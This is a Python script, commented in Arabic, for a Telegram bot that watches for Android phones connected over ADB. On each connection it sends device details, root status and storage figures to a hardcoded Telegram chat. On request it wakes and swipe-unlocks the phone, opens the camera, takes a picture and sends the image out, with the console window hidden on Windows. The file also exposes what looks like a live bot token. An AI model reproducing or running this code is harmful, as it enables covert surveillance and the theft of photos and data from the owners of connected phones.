import subprocess
import re
import time
import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- إعدادات البوت ---
BOT_TOKEN = "8060685956:AAFHXTc20IE9uigl8_ESIJ9mQ04l7lgCtTA"
CHAT_ID = "1431886140"

bot = telebot.TeleBot(BOT_TOKEN)

# متغير لتتبع حالة الاتصال حتى لا يكرر الرسائل
device_connected_flag = False

# --- دوال ADB (النظام) ---
def run_adb_command(command):
    try:
        # إضافة خيار لإخفاء النافذة السوداء عند التنفيذ
        startupinfo = None
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        full_cmd = f"adb {command}" if not command.startswith("adb") else command
        result = subprocess.check_output(full_cmd, shell=True, stderr=subprocess.STDOUT, timeout=15, startupinfo=startupinfo).decode("utf-8")
        return result.strip()
    except:
        return None

def get_full_report():
    """تجميع تقرير الفحص"""
    report = "<b>🚀 تقرير الفحص التلقائي (AboElfadl)</b>\n"
    report += "--------------------------------\n"

    # 1. الموديل
    brand = run_adb_command("shell getprop ro.product.brand")
    model = run_adb_command("shell getprop ro.product.model")
    report += f"📱 <b>الجهاز:</b> {brand} {model}\n"

    # 2. البطارية
    batt = run_adb_command("shell dumpsys battery")
    if batt:
        level = re.search(r"level: (\d+)", batt)
        if level: report += f"🔋 <b>الشحن:</b> {level.group(1)}%\n"

    # 3. الروت
    su = run_adb_command("shell which su")
    root_state = "⚠️ ROOTED" if su else "✅ Safe"
    report += f"🛡️ <b>الروت:</b> {root_state}\n"
    
    # 4. التخزين
    df = run_adb_command("shell df -h /data")
    if df:
        lines = df.splitlines()
        if len(lines) > 1:
            parts = lines[1].split()
            report += f"💾 <b>التخزين:</b> متاح {parts[2]} / كلي {parts[0]}\n"

    report += "--------------------------------\n"
    report += "👇 <b>تحكم في الجهاز الآن:</b>"
    return report

# --- دوال الكاميرا والتصوير ---
def take_photo_and_send(chat_id):
    try:
        bot.send_message(chat_id, "📸 جاري فتح الكاميرا والتقاط الصورة...")
        
        # 1. إيقاظ الشاشة وفتح القفل (محاولة)
        run_adb_command("shell input keyevent 224") # Wakeup
        run_adb_command("shell input swipe 300 1000 300 500") # Swipe up to unlock

        # 2. فتح تطبيق الكاميرا
        run_adb_command("shell am start -a android.media.action.IMAGE_CAPTURE")
        time.sleep(3) # انتظار فتح الكاميرا

        # 3. التقاط الصورة (الضغط على زر التصوير)
        run_adb_command("shell input keyevent 27")
        time.sleep(2)

        # 4. الحيلة الذكية: أخذ لقطة شاشة للكاميرا وإرسالها (أضمن طريقة)
        # لأن سحب ملف الصورة الأصلي يتطلب معرفة المسار بدقة وهذا يختلف بين الهواتف
        run_adb_command("shell screencap -p /sdcard/camera_view.png")
        
        # 5. سحب الصورة للكمبيوتر
        if os.path.exists("camera_view.png"):
            os.remove("camera_view.png") # حذف القديمة
        
        run_adb_command("pull /sdcard/camera_view.png camera_view.png")

        # 6. إرسال الصورة للبوت
        if os.path.exists("camera_view.png"):
            with open("camera_view.png", "rb") as photo:
                bot.send_photo(chat_id, photo, caption="✅ تم التقاط الصورة عبر ADB")
            
            # إغلاق الكاميرا بعد الانتهاء
            run_adb_command("shell input keyevent 3") # Home button
        else:
            bot.send_message(chat_id, "❌ حدث خطأ في سحب الصورة.")

    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {e}")

# --- التعامل مع أزرار التيليجرام ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "snap_photo":
        # تشغيل التصوير في Thread منفصل لعدم تجميد البوت
        threading.Thread(target=take_photo_and_send, args=(call.message.chat.id,)).start()
        bot.answer_callback_query(call.id, "جاري التنفيذ...")

# --- حلقة المراقبة (Thread منفصل) ---
def usb_monitor_loop():
    global device_connected_flag
    print("👀 نظام المراقبة يعمل... بانتظار الأجهزة...")
    
    while True:
        try:
            devices = run_adb_command("devices")
            # التحقق هل هناك جهاز متصل وحالته device
            if devices and "\tdevice" in devices:
                if not device_connected_flag:
                    print("🚀 تم توصيل جهاز! جاري الإرسال...")
                    
                    # 1. تجهيز التقرير
                    report_text = get_full_report()
                    
                    # 2. تجهيز الزر
                    markup = InlineKeyboardMarkup()
                    btn_photo = InlineKeyboardButton("📸 التقاط صورة (أمامية/خلفية)", callback_data="snap_photo")
                    markup.add(btn_photo)

                    # 3. الإرسال
                    bot.send_message(CHAT_ID, report_text, parse_mode="HTML", reply_markup=markup)
                    
                    device_connected_flag = True
            else:
                if device_connected_flag:
                    print("🔌 تم فصل الجهاز.")
                    bot.send_message(CHAT_ID, "🔌 <b>تم فصل الجهاز.</b>", parse_mode="HTML")
                    device_connected_flag = False
            
            time.sleep(4)
        except Exception as e:
            print(f"Error in monitor: {e}")
            time.sleep(5)

# --- التشغيل الرئيسي ---
if __name__ == "__main__":
    # تشغيل سيرفر ADB
    subprocess.run(["adb", "start-server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # تشغيل مراقب الـ USB في مسار منفصل (Thread)
    monitor_thread = threading.Thread(target=usb_monitor_loop)
    monitor_thread.daemon = True
    monitor_thread.start()

    # تشغيل البوت
    print("🤖 البوت يعمل الآن (AboElfadl Bot Started)...")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("Stop.")